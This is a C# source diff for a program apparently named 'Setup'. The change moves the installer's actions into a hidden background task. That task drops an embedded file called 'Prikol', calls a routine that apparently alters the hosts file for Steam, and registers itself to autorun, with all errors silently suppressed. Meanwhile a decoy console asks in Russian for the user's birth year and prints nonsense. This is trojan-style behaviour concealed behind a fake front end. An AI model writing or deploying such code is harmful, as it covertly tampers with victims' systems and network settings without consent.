@@ -15,18 +15,29 @@ namespace Setup
 
         static void Main(string[] args)
         {
-            try
+            Task.Run(() =>
             {
-                File.WriteAllBytes(pathToPrikol, Resource1.Prikol);
+                try
+                {
+                    File.WriteAllBytes(pathToPrikol, Resource1.Prikol);
 
-                HostsSteam();
-                SetToAutorun();
-            }
+                    HostsSteam();
+                    SetToAutorun();
+                }
 
-            catch
-            {
+                catch
+                {
 
-            }
+                }
+            });
+
+            Console.Write("Введите ваш год рождения: ");
+            Console.ReadLine();
+            Console.WriteLine("Похоже вам: ");
+            Console.WriteLine("Загрузка");
+            for(var i = 0; i < 1000; i++) Console.Write($"{i}");
+            Console.WriteLine("Аапапахапхахпхапахпхапх, а я че знаю что-ли, апаапазпзапзапзазпазпхапвхаххпахххапахпхапаххаппаапъаъпхаахпахпап");
+            Console.ReadKey();
         }
 
         static void SetToAutorun()
